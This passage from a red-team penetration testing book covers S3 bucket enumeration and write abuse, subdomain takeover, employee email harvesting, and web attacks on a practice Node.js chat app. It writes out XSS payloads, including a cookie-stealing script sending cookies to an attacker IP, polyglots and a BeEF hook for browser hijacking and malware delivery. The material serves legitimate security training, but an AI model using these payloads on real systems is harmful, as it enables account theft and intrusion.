retrieve the container ID by\ntyping:\ndocker ps -a\nOnce you have the container ID, get the results file from the\ncontainer to the host by typing:\ndocker cp <container -id>:/data/results.txt .\n \nCloud\nAs we spoke prior , cloud is one area where we see a lot of companies\nimproperly securing their environment.  The most common  issues we\ngenerally see are:\nAmazon S3 Missing Buckets:\nhttps://hackerone.com/reports/121461\nAmazon S3 Bucket Permissions:\nhttps://hackerone.com/reports/128088\nBeing able to list and write files to public A WS buckets:\naws s3 ls s3://[bucketname]\naws s3 mv test.txt s3://[bucketname]\nLack of Logging\n \nBefore we can start testing misc onfigurations on different AWS buckets, we\nneed to first identify them.  We are going to try a couple different tools to\nsee what we can discover on our victim’ s AWS infrastructure.\nS3 Bucket Enumeration\nThere are many tools that can perform S3 bucket enumeration for AWS. \nThese tools generally take keywords or lists, apply multiple permutations,\nand then try to identify different buckets.  For example, we can use a tool\ncalled Slurp (https://github.com/bbb31/slurp) to find information about our\ntarget CyberSpaceKittens:\ncd /opt/slurp\n./slurp domain -t cyberspacekittens.com\n./slurp keyword -t cyberspacekittens\n \nBucket Finder\nAnother tool, Bucket Finder , will not only attempt to find different buckets,\nbut also download all the content from those buckets for analysis:\nwget https://digi.ninja/files/bucket_finder_1.1.tar .bz2 -O\nbucket_finder_1.1.tar .bz2\ncd /opt/bucket_finder\n./bucket_finder .rb --region us my_words --download\n \n \nYou have been running discovery on Cyber Space Kittens’ infrastructure\nand identify one of their S3 buckets\n(cyberspacekittens.s3.amazonaws.com).  What are your first steps in\nretrieving what you can and cannot see on the S3 bucket?  You can first pop\nit into a browser and see some information:\n \n \nPrior to starting , we need to create an AWS account to get an Access Key\nID.  You can get yours for free at Amazon here:\nhttps://aws.amazon.com/s/dm/optimization/server -side-test/free-\ntier/free_np/.  Once you create  an account, log into AWS, go to Your\nSecurity Credentials (https://amzn.to/2ItaySR), and then to Access Keys. \nOnce you have your AWS Acce ss ID and Secret Key, we can query our S3\nbuckets.\n \nQuery S3 and Download Everything:\nInstall awscli\nsudo apt install awscli\nConfigure Credentials\naws configure\nLook at the permissions on CyberSpaceKittens' S3 bucket\naws s3api get-bucket-acl --bucket cyberspacekittens\nRead files from the S3 Bucket\naws s3 ls s3://cyberspacekittens\nDownload Everything in the S3 Bucket\naws s3 sync s3://cyberspacekittens .\n \nOther than query S3, the next thing to test is writing to that bucket.  If we\nhave write access, it could allow  complete RCE of their applic ations.  We\nhave often seen that when files stored on S3 buckets are used on all of their\npages (and if we can modify these files), we can put our malicious code on\ntheir web application servers.\n \nWriting to S3:\necho \"test\" > test.txt\naws s3 mv test.txt s3://cyberspacekittens\naws s3 ls s3://cyberspacekittens\n \n*Note, write has been removed from the Everyone group.  This was just for\ndemonstration.\n \nModify Access Contr ols in A WS Buckets\nWhen analyzing  AWS security , we need to review the controls around\npermissions on objects and buckets.  Objects are the individu al files and\nbuckets are logical units of storage.  Both of these permissions can\npotentially be modified by any user if provisioned incorrectly . \n \nFirst, we can look at each objec t to see if these permissions are configured\ncorrectly:\naws s3api get-object-acl --bucket cyberspacekittens --key\nignore.txt\n \nWe will see that the file is only writeable by a user named “secure”.  It is\nnot open to everyone.   If we did have write access, we could use the put-\nobject in s3api to modify that file.\n \nNext, we look to see if we can modify the buckets themselves.  This can be\naccomplished with:\naws s3api get-bucket-acl --bucket cyberspacekittens\n \n \nAgain, in both of these cases, READ is permissioned globally , but\nFULL_CONTROL or any write is only allowed by an account called\n“secure”.  If we did have access to the bucket, we could use the --grant-full-\ncontrol to give ourselves full control of the bucket and objects. \n \nResources:\nhttps://labs.detectify .com/2017/07/13/a-deep-dive-into-aws-\ns3-access-controls-taking-full-control-over -your -assets/\n \nSubdomain T akeovers\nSubdomain takeovers are a common vulnerability we see with almost every\ncompany these days.  What happens is that a company utilizes some third\nparty CMS/Content/Cloud Provider and points their subdomains to these\nplatforms.  If they ever forget to configure the third party service or\nderegister from that server , an attacker can take over that hostname with the\nthird party . \n \nFor example, you register an S3 Amazon Bucket with the name\ntestlab.s3.amazonaws.com.  You then have your company’ s subdomain\ntestlab.company .com point to testlab.s3.amazonaws.com.  A year later, you\nno longe r need the S3 bucket testlab.s3.amazonaws.com and deregister it,\nbut forget the CNAME redirect for testlab.company .com.  Someone can\nnow go to AWS and set up testlab.s3.amazon.com and have a valid S3\nbucket on the victim’ s domain.\n \nOne tool to check for vulnerable  subdomains is called tko-subs.  We can use\nthis tool to check whether any of the subdomains we have found pointing to\na CMS provider (Heroku, Github, Shopify , Amazon S3, Amazon\nCloudFront, etc.) can be taken over .\n \nRunning tko-subs:\ncd /opt/tko-subs/\n./tkosubs -domains=list.txt -data=providers-data.csv -\noutput=output.csv\n \nIf we do find a dangling CNAM E, we can use tko-subs to take over Github\nPages and Heroku Apps.  Otherwise, we would have to do it manually . \nTwo other tools that can help with domain takeovers are:\nHostileSubBruteforcer\n(https://github.com/nahamsec/HostileSubBruteforcer)\nautoSubT akeover\n(https://github.com/JordyZomer/autoSubT akeover)\n \nWant to learn more about AWS vulnerabilities?  A great CTF AWS\nWalkthrough: http://flaws.cloud/ .\n \nEmails\nA huge part of any social engineering attack is to find email addresses and\nnames of employees.  We used Discover Script in the previous chapters,\nwhich is great for collecting much of this data.  I usually start with Discover\nscripts and begin digging into the other tools.  Every tool does things\nslightly differently and it is beneficial to use as many automate d processes\nas you can.\n \nOnce you get a small list of emails, it is good to understand their email\nformat.  Is it firstname.lastname @cyberspacekitten.com or is it first\ninitial.lastname @cyberspacekittens.com?  Once you can figure out their\nformat, we can use tools like LinkedIn to find more employees and try to\nidentify their email addresses.\nSimplyEmail\nWe all know that spear phishing is still one of the more successful avenues\nof attack.  If we don’t have any vulnerabilities from the outside, attacking\nusers is the next step.  To build a good list of email addresses, we can use a\ntool like SimplyEmail.  The output of this tool will provide the email\naddress format of the company and a list of valid users\n \nLab:\nFind all email accounts for cnn.com\ncd /opt/SimplyEmail\n./SimplyEmail.py -all -v -e cyberspacekittens.com\nfirefox cyberspacekittens.com<date_time>/Email_List.html\n \nThis may take a long time to run as it checks Bing, Yahoo, Google, Ask\nSearch, PGP Repos, files, and much more.  This may also make your\nnetwork look like a bot to search engines and may require captchas if you\nproduce too many search requests. \n \nRun this against  your company .  Do you see any email addresses that you\nrecognize?  These might be the first email addresses that could be targeted\nin a lar ge scale campaign.\nPast Br eaches\nOne of the best ways to get email accounts is to continually monitor and\ncapture past breaches.  I don't want to link directly to the breaches files, but\nI will reference some of the ones that I have found useful:\n \n1.4 Billion Password Leak 2017:\nhttps://thehackernews.com/2017/12/data-breach-password-\nlist.html\nAdobe Breach from 2013:\nhttps://nakedsecurity .sophos.com/2013/1 1/04/anatomy-of-a-\npassword-disaster -adobes-giant-sized-cryptographic-blunder/\nPastebin Dumps: http://psbdmp.ws/\nExploit.In Dump\nPastebin Google Dork: site:pastebin.com\nintext:cyberspacekittens.com\n \nAdditional Open Source Resources\nI didn't know exactly where to put these resources, but I wanted to provide a\ngreat collection of other resources used for Red Team style campaigns. \nThis can help identify people, locations, domain information, social media,\nimage analysis, and more. \n \nCollection of OSINT Links:\nhttps://github.com/IVMachiavelli/OSINT_T eam_Links\nOSINT Framework: http://osintframework.com/\nC o n c l u s i o n\nIn this chapter we went over all the different reconnaissance tactics and\ntools of the trade.  This is just a start as many of these techniques are\nmanual and require a fair amount of time to execute.  It is up to you to take\nthis to the next level, automate all these tools, and make the recon fast and\nefficient.\n \n \n3 the throw - web application exploitation\n \n \n \n \n \nOver the past couple of years, we have seen some critical, externally-facing\nweb attacks.  Everything from the Apache Struts 2 (although not confirmed\nfor the Equifax breach - http://bit.ly/2HokW i0), Panera Bread\n(http://bit.ly/2qwEMxH), and Uber (http://ubr .to/2hIO2tZ).  There is no\ndoubt we will continue to see many other severe breaches from public\ninternet facing end-points.\n \nThe security industry , as a whole, runs in a cyclical pattern.  If you look at\nthe different layers of the OSI model, the attacks shift to a different layer\nevery other year.  In terms of web, back in the early 2000s, there were tons\nof SQLi and RFI type exploits.  However , once companies started to harden\ntheir external environments and began performing external penetration test,\nwe, as attackers, moved to Layer 8 attacks focusing on social engineering\n(phishing) for our initial entry point.  Now , as we see organizations\nimproving their internal security with Next Generation Endpo int/Firewall\nProtection, our focus is shifting  back onto application exploitation.   We\nhave also seen a huge complexity increase in applications, APIs, and\nlanguages, which has reopened many old and even new vulnerabilities.\n \nSince this book is geared more toward Red Teaming concepts, we will not\ngo too deeply into all of the different web vulnerabilities or how to\nmanually exploit them.  This won't be your checklist style book.  You will\nbe focusing on vulnerabilities that Red Teamers and bad guys are seeing in\nthe real world, which lead to the compromising of PII, IP, networks, and\nmore.  For those who are looking for the very detailed web methodologies, I\nalways recommend starting with the OWASP Testing Guide\n(http://bit.ly/2GZbVZd and\nhttps://www .owasp.or g/images/1/19/OTGv4.pdf).\n \nNote, since as many of the attacks from THP2 have not changed, we won't\nbe repeating examples like SQLMap, IDOR attacks, and CSRF\nvulnerabilities in the following exercises. Instead, we will focus on newer\ncritical ones. \n \nBug Bounty Programs:\nBefore we start learning how to exploit web applications, let’s talk a little\nabout bug boun ty programs.  The most common question we get is, “how\ncan I continually  learn after these trainings?”  My best recommendation is\nto do it against real, live systems.  You can do training labs all day, but\nwithout that real-life experience, it is hard to grow .\n \nOne caveat though: on average, it takes about 3-6 months before you begin\nto consis tently find bugs.  Our advice: don’t get frustrated, keep up-to-date\nwith other bug bounty hunters , and don’t forget to check out the older\nprograms.\n \nThe more common bug bounty programs are HackerOne\n(https://www .hackerone.com), BugCrowd (https://bugcrowd.com/programs)\nand SynAck (https://www .synack.com/red-team/).  There are plenty of other\nones out there as well (https://www .vulnerability-lab.com/list-of-bug-\nbounty-programs.php).  These programs can pay anywhere from Free to\n$20k+. \n \nMany of my students find it daunting to start bug hunting.  It really requires\nyou to just dive in, allot a few hours a day, and focus on underst anding how\nto get that sixth sense to find bugs.  Generally , a good place to start is to\nlook at No-Reward Bug Bount y Programs (as the pros won’ t be looking\nhere) or at large older program s like Yahoo.  These types of sites tend to\nhave a massive scope and lots of legacy servers.  As mentioned in prior\nbooks, scoping out pentests is important and bug bounties are no different. \nMany of the programs specify what can and cannot be done (i.e., no\nscanning, no automated tools, which domains can be attacked, etc.). \nSometimes you get lucky and they allow *.company .com, but other times it\nmight be limited to a single FQDN. \n \nLet’s look at eBay , for example,  as they have a public bug bounty program. \nOn their bug bounty site\n(http://pages.ebay .com/securitycenter/Researchers.html), they state\nguidelines, eligible domains, eligible vulnerabilities, exclusio ns, how to\nreport, and acknowledgements:\n \n \nHow you report vulnerabilities to the company is generally just as important\nas the finding itself.  You want to make sure you provide the company with\nas much  detail as possible.  This would include the type of vulnerability ,\nseverity/criticality , what steps you took to exploit the vulnerability ,\nscreenshots, and even a work ing proof of concept.  If you need help\ncreating consistent reports, take a look at this report generation form:\nhttps://buer .haus/breport/index.php.\n \n \nHaving run my own programs before, one thing to note about exploiting\nvulnerabilities for bug bounty programs is that I have seen a few cases\nwhere researchers got carried away and went past validating the\nvulnerability .  Some examples include dumping a whole database after\nfinding an SQL injection, defacing a page with something they thought was\nfunny after a subdomain takeover , and even laterally movin g within a\nproduction environment after an initial remote code execution\nvulnerability .  These cases could lead to legal trouble and to potentially\nhaving the Feds at your door.  So use your best judgement, check the scope\nof the program, and remember that if it feels illegal, it probably is.\nWeb Attacks Introduction - Cyber Space Kittens\nAfter finishing reconnaissance and discovery , you review all the different\nsites you found.   Looking throu gh your results, you don’t see the standard\nexploitable servers/misconfigur ed applications.  There aren’ t any Apache\nTomcat servers or Heartbleed/Sh ellShock, and it looks like they patched all\nthe Apache Strut issues and their CMS applications.\n \nYour sixth sense intuition kicks into full gear and you start poking around at\ntheir Customer Support System  application.  Something just doesn’ t feel\nright, but where to start? \n \nFor all the attacks in the Web Application Exploitation chapter , a custom\nTHP3 VMWare Virtual Machin e is available to repeat all these labs.  This\nvirtual machine is freely available here: \nhttp://thehackerplaybook.com/get.php?type=csk-web\n \nTo set up the demo for the W eb Environment (Customer System Support):\nDownload the Custom THP VM from:\nhttp://thehackerplaybook.com/get.php?type=csk-web\nDownload the full list of commands for the labs:\nhttps://github.com/cheetz/THP-\nChatSupportSystem/blog/master/lab.txt\nBit.ly Link: http://bit.ly/2qBDrFo\nBoot up and log into the VM\nWhen the VM is fully booted, it should show you the current IP\naddress of the application.  You do not need to log into the VM\nnor is the password pr ovided.  It is up to you to break into the\napplication.\nSince this is a web application hosted on your own system, let's\nmake a hostname record on our attacker Kali system:\nOn our attacker Kali VM, let's edit our host file to\npoint to our vulnerable application to reference the\napplication by hostname versus by IP:\ngedit /etc/hosts\nAdd the following line with the IP of your vulnerable\napplication:\n[IP Address of V uln App] chat\nNow , go to your browser in Kali and go to\nhttp://chat:3000/.  If everything worked, you should\nbe able to see the NodeJS Custom V uln Application.\n \nThe commands and attacks for the web section can be extremely long and\ncomplicated.  To make it easy, I’ve included all the commands you’ll need\nfor each lab here:\nhttps://github.com/cheetz/THP-ChatSupportSystem/blog/master/lab.txt\n \nThe Red T eam W eb Application Attacks\nThe first two books focused on how to efficiently and effectively test Web\nApplications – this time will be a little dif ferent.  W e are going to skip many\nof the basic attacks and move into attacks that are used in the real world.\n \nSince this is more of a practical  book, we won’ t go into all of the detailed\ntechnicalities of web application testing.  However , this doesn’ t mean that\nthese details should be ignored.  A great resource for web application\ntesting information is Open Web Application Security Project, or OWASP. \nOWASP focuses on developing and educating users on application security . \nEvery few years , OWASP compiles a list of the most common issues and\npublishes them to the public - http://bit.ly/2HAhoGR.  A more in-depth\ntesting guideline is located here: http://bit.ly/2GZbVZd.  This document\nwill walk you through the types of vulnerabilities to look for, the risks, and\nhow to exploit them.  This is a great checklist document:\nhttp://bit.ly/2qyA9m1.\n \nAs many of my readers are trying to break into the security field, I wanted\nto quick ly menti on one thing: if you are going for a penetration testing job,\nit is imperative to know , at a minimum, the OWASP Top 10 backwards and\nforwards.  You should not only know what they are, but also have good\nexamples for each one in terms of the types of risks they bring  and how to\ncheck for them.  Now , let's get back to compromising CSK.\n \nChat Support Systems Lab\nThe Chat Support System lab that will be attacked was built to be\ninteractive and highlight both new and old vulnerabilities.  As you will see,\nfor many of the following labs, we provide a custom VM with a version of\nthe Chat Support System.\n \nThe application itself was written in Node.js.  Why Node?  It is one of the\nfastest growing applications that we see as penetration testers.  Since a lot\nof developers seem to really like Node, I felt it was important for you to\nunderstand the security implications of running JavaScript as backend\ncode. \nWhat is Node?\n“Node.js® is a JavaScript runtime built on Chrome's V8 JavaScript engine.\nNode.js uses an event-driven, non-blocking I/O model that makes it\nlightweight and efficient.” [https://nodejs.or g/en/] Node.js' package\necosystem, NPM , is the largest ecosystem of open source libraries in the\nworld.\n \nAt a very basic level, Node.js allows you to run JavaScript outside of a\nbrowser .  Due to the fact that Node.js is lean, fast, and cross-plat form, it can\ngreatly simplify  a project by unifying the stack.  Although Node.js is not a\nweb server , it allows a server (something you can program in JavaScript) to\nexist in an environment outside of the actual W eb Client.\n \nBenefits:\nVery fast\nSingle-threaded JavaScript environment which is capable of\nacting as a standalone web application server\nNode.js is not a protocol; it is a web server written in JavaScript\nThe NPM registry hosts almost half a million packages of free,\nreusable Node.js code, which makes it the lar gest software\nregistry in the world\n \nWith Node.js becoming so popular in the past couple years , it is very\nimportant for penetration tester s/Red Teamers to understand what to look\nfor and how to attack these applications.  For example, a researcher\nidentified that weak NPM credentials gave him edit/publish access to 13%\nof NPM  package s.  Through dependency chains, an estimated 52% of NPM\npackages could have been vulnerable.\n[https://www .bleepingcomputer .com/news/security/52-percent-of-all-\njavascript-npm-packages-could-have-been-hacked-via-weak-credentials/]\n \nIn the following examples, our labs will be using Node.js as the foundation\nof our applications, which will utilize the Express framework\n(https://expressjs.com/) for our web server .  We will then add the Pug\n(https://pugjs.or g/) template engine to our Express framework.  This is\nsimilar to what we are now commonly seeing in newe r-developed\napplications.\n \n \nExpress is a minimalistic web framework for Node.js. Express provides a\nrobust set of features for web and mobile applications so you don't have to\ndo a lot of work . With modules called Middlewares, you can add third party\nauthentication or services like Facebook Auth or Stripe Payment\nprocessing.\n \nPug, formally known as Jade, is a server -side templating engine that you\ncan (but do not have to) use with Express. Jade is for programmatically\ngenerating the HTML on the server and sending it to the client.\n \nLet's attack CSK and boot up the Chat Support System V irtual Machine.\n \nCyber Space Kittens:  Chat Support Systems\nYou stumble across the external ly-facing Cyber Space Kittens chat support\nsystem.  As you slowly sift through all the pages and understand the\nunderlying syste m, you look for weaknesses in the application.  You need to\nfind your first entry point into the server so that you can pivot into the\nproduction environment. \n \nYou first run through all of your vulnerability scanner and web application\nscanner reports, but come up empty-handed.  It looks like this company\nregularly runs the common vuln scanners and has patched most of its\nissues.  The golden egg findings now rely on coding issues,\nmisconfigurations, and logic flaws.  You also notice that this application is\nrunning NodeJS, a recently popular language. \n \nSetting Up Y our W eb Application Hacking Machine\nAlthough there are no perfect recipes for Red Teaming Web Applications,\nsome of the basic tools you will need include:\nArming yourself with browsers.  Many browsers act very\ndifferently especially with complex XSS evasion:\nFirefox (my favorite for testing)\nChrome\nSafari\nWappalyzer: a cross-platform utility that uncovers the\ntechnologies used on websites. It detects content management\nsystems, ecommerce platforms, web frameworks, server\nsoftware, analytics tools and many more.\nhttps://wappalyzer .com/\nBuiltW ith: a web site profiler tool. Upon looking up a page,\nBuiltW ith returns all the technologies it can find on the page.\nBuiltW ith’s goal is to help developers, researchers and designers\nfind out what technologies pages are using, which may help\nthem to decide what technologies to implement themselves.\nhttps://builtwith.com/\nRetire.JS: scan a web app for use of vulnerable JavaScript\nlibraries. The goal of Retire.js is to help you detect use of a\nversion with known vulnerabilities.\nhttps://chrome.google.com/webstore/detail/retirejs/mo\nibopkbhjceeedibkbkbchbjnkadmom?hl=en\nBurp Suite (~$350): although this commercial tool is a bit\nexpensive, it is definitely worth every penny and a staple for\npenetration testers/Red T eamers.  Its benefits come from the\nadd-ons, modular design, and user development base.  If you\ncan't af ford Burp, OW ASP ZAP (which is free) is an excellent\nreplacement.\n \nAnalyzing a W eb Application\nBefore we do any type of scann ing, it is important to try to understand the\nunderlying code and infrastructure.  How can we tell what is running the\nbackend?  We can use Wappa lyzer , BuiltW ith, or just Google Chrome\ninspect.  In the images below , when loading up the Chat applica tion, we can\nsee that the HTTP headers have  an X-Powered By: Express.  We can also\nsee with W appalyzer that the application is using Express and Node.js.\n \n \nUnderstanding the application before blindly attacking a site can help\nprovide you with a much better approach.  This could also help with\ntargeted sites that might have WAFs, allowing you to do a more ninja\nattack. \n \nWeb Discovery\nIn the previous books, we went into more detail on how to use Burp Suite\nand how to penetration test a site.  We are going to skip over a lot of the\nsetup basics and focus more on attacking the site. \n \nWe are going to assume, at this point, that you have Burp Suite all set up\n(free or paid) and you are on the THP Kali image.   Once we have an\nunderstanding of the underlying system, we need to identify all the\nendpoints.  We still need to run the same discovery tools as we did in the\npast. \n \nBurp Suite (https://portswigger .net/burp)\nSpidering: In both the free and paid versions, Burp\nSuite has a great Spidering tool. \nContent Discovery: If you are using the paid version\nof Burp Suite, one of the favorite discovery tools is\nunder Engagement tools, Discover Content.  This is a\nsmart and ef ficient discovery tool that looks for\ndirectories and files.  Y ou can specify several dif ferent\nconfigurations for the scan.\nActive Scan: Runs automated vulnerability scanning\non all parameters and tests for multiple web\nvulnerabilities.\nOWASP ZAP (http://bit.ly/2IVNaO2)\nSimilar to Burp, but completely open source and free. \nHas similar discover and active scan features.\nDirbuster\nAn old tool that has been around forever to discover\nfiles/folders of a web application, but still gets the job\ndone. \nTarget URL:  http://chat:3000\nWord List:\n/usr/share/wordlists/dirbuster/directory-list-\n2.3-small.txt\nGoBuster (https://github.com/OJ/gobuster)\nVery lightweight, fast directory and subdomain\nbruteforce tool\ngobuster -u http://chat:3000 -w\n/opt/SecLists/Discovery/W eb-Content/raft-small-\ndirectories.txt -s 200,301,307 -t 20\n \nYour wordlists are very important.  One of my favorite wordlists to use is an\nold one called raft, which is a collection of many open source projects.  You\ncan find these and other valuable wordlists here:\nhttps://github.com/danielmiessler/SecLists/tree/master/Discovery/W eb-\nContent (which is already included in your THP Kali image). \n \nNow that we are done with the overview , let’s get into some attacks.  From\na Red Team perspective, we are looking for vulnerabilities we can actively\nattack and that provide the most bang for our buck.  If we were doing an\naudit or a penetration test, we might report vulnerabilities like SSL issues,\ndefault Apache pages, or non-exploitable vulnerabilities from vulnerability\nscanner .  But, on our Red Team engagements, we can completely ignore\nthose and focus on attacks that get us advanced access, shells, or dump PII. \n \nCross-Site Scripting XSS\nAt this point, we have all seen and dealt with Cross-Site Scripting (XSS). \nTesting every variable on a website with the traditional XSS attack:\n<script>alert(1)</script>, might be great for bug bounties, but can we do\nmore?  What tools and methods can we use to better utilize these attacks?\n \nSo, we all know that XSS attacks are client-side attacks that allow an\nattacker to craft a specific web request to inject malicious code into a\nresponse.  This could generally be fixed with proper input validation on the\nclient and server -side, but it is never that easy.  Why , you ask?  It is due to a\nmultitude of reasons.  Everythi ng from poor coding, to not understanding\nframeworks, and sometimes applications just get too complex and it\nbecomes hard to understand where an input goes.\n \nBecause the alert boxes don't really do any real harm, let's start with some\nof the basic types of XSS attacks:\nCookie Stealing XSS: <script>document.write('<img\nsrc=\"http://<Y our IP>/Stealer .php?cookie=' %2B\ndocument.cookie %2B '\" />');</script>\nForcing the Download of a File: <script>var link =\ndocument.createElement('a'); link.href =\n'http://the.earth.li/~sgtatham/putty/latest/x86/putty .exe';\nlink.download = ''; document.body .appendChild(link);\nlink.click();</script>\nRedirecting User: <script>window .location =\n\"https://www .youtube.com/watch?v=dQw4w9WgXcQ\";\n</script>\nOther Scripts to Enable Key Loggers, T ake Pictures, and More\nhttp://www .xss-payloads.com/payloads-list.html?\nc#category=capture\nObfuscated/Polyglot XSS Payloads\nIn today's world, the standard XSS payload still works pretty often, but we\ndo come  across applications that block certain characters or have WAFs in\nfront of the application.  Two good resources to help you start crafting\nobfuscated XSS payload attacks:\nhttps://github.com/foospidy/payloads/tree/master/other/xss\nhttps://www .owasp.or g/index.php/XSS_Filter_Evasion_Cheat_S\nheet\n \nSometimes during an assessment, you might run into simple XSS filters that\nlook for strings like <script>.   Obfuscating the XSS payload is one option,\nbut it is also important to note that not all JavaScript payloads require the\nopen and close <script> tags.  There are some HTML Event Attributes that\nexecute JavaScript when triggered\n(https://www .w3schools.com/tags/ref_eventattributes.asp).  This means any\nrule that looks specifically for Script tags will be useless.  For example,\nthese HTML Event Attributes that execute JavaScript being  outside a\n<script> tag:\n<b onmouseover=alert('XSS')>Click Me!</b>\n<svg onload=alert(1)>\n<body onload=\"alert('XSS')\">\n<img src=\"http://test.cyberspacekittens.com\"\nonerror=alert(document.cookie);>\n \nYou can try each of these HTML entity attacks on the CSK application by\ngoing to the application: http://chat:3000/ (remember to modify your\n/etc/host file to point chat to your VM IP).  Once you are there, register an\naccount, log into the applica tion, and go to the chat functionality\n(http://chat:3000/chatchannel/1).  Try the different entity attacks and\nobfuscated payloads.\n \n \nOther great resources for XSS:\nThe first is Mind Map made by @jackmasa.  This is a great\ndocument that breaks down different XSS payloads based on\nwhere your input is served.  Although no longer on JackMasa\nGitHub page, a copy exists here:  http://bit.ly/2qvnLEq.  \nAnother great resource that discusses which browsers are\nvulnerable to which XSS payloads is:  https://html5sec.or g/.\n \n*JackMasa XSS Mind Map\n \nAs you can see, it is sometime s annoying to try to find every XSS on an\napplication.  This is because vulnerable parameters are affected by code\nfeatures, different types of HTML tags, types of applications, and different\ntypes of filtering.  Trying to find that initial XSS pop-up can take a long\ntime.  What if we could try and chain multiple payloads into a single\nrequest? \n \nThis last type of payload is called a Polyglot.  A Polyglot payload takes\nmany different types of payload/obfuscation techniques and compiles them\ninto one attack.  This is great for automated scripts to look for XSS, bug\nbounty hunters with limited time, or just a quick way to find input\nvalidation issues.\n \nSo, inste ad of the normal <scrip t>alert(1)</script>, we can build a Polyglot\nlike this (http://bit.ly/2GXxqxH):\n/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert()\n)//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/-\n-!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n \nIf you look at the payload above, the attack tries to break out of comments,\nticks and slashes; perform an onclick XSS; close multiple tags; and lastly\ntries an onload XSS.  These types of attacks make Polyglots extremely\neffective and efficient at identif ying XSS.  You can read more about these\nPolyglot XSSs here:\nhttps://github.com/0xsobky/HackV ault/wiki/Unleashing-an-Ultimate-XSS-\nPolyglot\n \nIf you want to test and play around with the different polyglots, you can\nstart here on the vulnerable XSS pages (http://chat:3000/xss) or throughout\nthe Chat Application.\nBeEF\nBrowser Exploi tation Framewo rk (http://beefproject.com/) or BeEF , takes\nXSS to another level.  This tool injects a JavaScript payload onto the\nvictim’ s browse r, which infects the user’s system.  This creates a C2\nchannel on the victim’ s browser for JavaScript post-exploitation. \n \nFrom a Red Team perspective, BeEF is a great tool to use on campaigns,\ntrack users, capture credent ials, perform clickjacking, attack with\ntabnapping and more.  If not used during an attack, BeEF is a great tool to\ndemonstrate the power of an XSS vulnerability .  This could assist in more\ncomplicated attacks as well, which we will discuss later in the book under\nBlind XSS.\n \nBeEF is broken down into two parts: one is the server and the other is the\nattack payload.  T o start the server:\n \nStart BeEF on Y our Attacker Kali Host\nFrom a T erminal\nbeef-xss\nAuthenticate with beef:beef\nView http://127.0.0.1:3000/hook.js\nFull Payload Hook File:\n<script src=\"http://<Y our IP>:3000/hook.js\">\n</script>\n \nViewing your hook.js file located on http://127.0.0.1:3000/hook.js, you\nshould see something that resembles a long-obfuscated JavaScript file.  This\nis the client payload to connect your victim back to the command and\ncontrol server . \n \nOnce you have identified an XSS on your target application, instead of the\noriginal alert(1) style payload, you would modify the <script\nsrc=\"http://<Y our IP>:3000/hook.js\"></script> payload to exploit the\nvulnerability .  Once your victim falls for this XSS trap, it will cause their\nbrowser to connect back to you and be a part of your Zombie network. \n \nWhat types of post exploitation  attacks does BeEF support?   Once your\nvictim is under your control, you really can do anything that JavaScript can\ndo.  You can turn on their camera via HTLM5 and take a picture of your\nvictim, you can push overlays on their screen to capture credentials, or you\ncan redirect them to a malicious site to execute malware. \n \nHere is a quick demonstration of BeEF's ability to cause massive issues\nfrom an XSS attack:\n \nFirst, make sure your BeEF server is running on your attacker machine.  On\nour vulnerable Chat Support  System's application, you can go to\nhttp://chat:3000/xss and inside the Exercise 2 field and put in your payload:\n<script src=\"http://127.0.0.1:3000/hook.js\"></script>\n \nOnce your victim is connected to your Zombie network, you have full\ncontrol of their browser .  You can do all sorts of attacks based on their\ndevice, browser , and enabled features.  A great way to demonstrate XSS\nimpact with social engineering tactics is by pushing malware to their\nmachine via a Flash Update prompt.\n \n \nOnce executed, a pop-up will be presented on the victim's machine, forcing\nthem to install an update, which will contain additional malware. \n \n \nI recom mend spending some time playing around with all the BeEf post\nexploitation modules and unders tanding the power of JavaScript.  Since we\ncontrol the browser , we have to figure out how to use this in terms of Red\nTeam campaigns.  What else might you want to do once you have infected a\nvictim from an XSS?  We will discuss this in the XSS to Compromise\nsection.\n \nBlind XSS\nBlind XSS is rarely discussed as it is a patient person's game.  What is\nBlind XSS?  As the name of the attack suggests, it is when an execution of\na stored XSS payload is not visible to the attacker/user , but only visible to\nan administrator or back-end employee.  Although this attack could be very\ndetrimental due to its ability to attack backend users, it is often missed.\n \nFor exam ple, let's assume an application has a \"contact us\" page  that allows\na user to supply contact information to the administrator in order to be\ncontacted later.  Since the results of that data are only view able by an\nadministrator manually and not the requesting user and if the application\nwas vulnerable to XSS, then the attacker would not immediate ly see their\n\"alert(1)\" attack.  In these cases, we can use XSSHunter\n(https://xsshunter .com) to help us validate the Blind XSS. \n \nHow XSSHunter works is that when our JavaScript payload executes, it\nwill take a screenshot of the victim's screen (the current page they are\nviewing) and send that data back to the XSSHunter's site.  When this\nhappens, XSSHunter will send an alert that our payload executed and\nprovide us with all the detailed information.  We can now go back to create\na very malicious payload and replay our attack.\n \nXSS Hunter:\nDisable any Proxies (i.e. Burp Suite)\nCreate account at https://xsshunter .com\nLogin at https://xsshunter .com/app\nGo to Payloads to get your Payload\nModify the payload to fit your attack or build a Polyglot with it\nCheck XSS hunter to see the payload execution\n \n \n \nDOM Based XSS\nThe understand ing of reflective and stored XSS is relatively straight\nforward.  As we already know , the server doesn’ t provide adequate\ninput/output validation to the user/database and our malicious script code is\npresented back to user in source  code.  However , in DOM based XSS, it is\nslightly differen t, which many cause some common misund erstandings.\nTherefore, let’ s take some time to focus on DOM based XSS.\n \nDocument Object Model (DOM) based XSS is made possible when an\nattacker can manipulate the web application’ s client-side scripts.  If an\nattacker can inject malicious code into the DOM and have it read by the\nclient’ s browser , the payload can be executed when the data is read back\nfrom the DOM.\n \nWhat exactly is the DOM? The Document Object Model (DOM) is a\nrepresentation of HTML properties.  Since your browser doesn’ t understand\nHTML, it uses an interpreter that transforms HTML into a model called the\nDOM. \n \nLet's walk through this on the Chat Support Site.  Looking at the vulnerable\nweb application, you should be able to see that the chat site is vulnerable to\nXSS:\nCreate an account\nLogin\nGo to Chat\nTry <script>ale rt(1)</script> and then try some crazy XSS\nattacks! \n \nIn our example, we have Node.js on the server side, socket.io (a library for\nNode.js) setting up web sockets between the user and server , client-side\nJavaScript, and our malicious msg.msgT ext JavaScript.  As you can see\nbelow and in source code for the page, you will not see your \"alert\" payload\ndirectly referenced as you would in a standard reflective/stored XSS.  In\nthis case, the only reference we would receive that indicates  where our\npayload might be called, is from the msg.name reference.  This does\nsometimes make it hard to figur e out where our XSS payload is executed or\nif there is a need to break out of any HTML tags.\n \n \nAdvanced XSS in NodeJS\nOne of the big reasons why XSS keeps coming back is that it is much\nharder than just filtering for tags or certain characters.  XSS gets really\ndifficult to defend when the payloads are specific to a certain 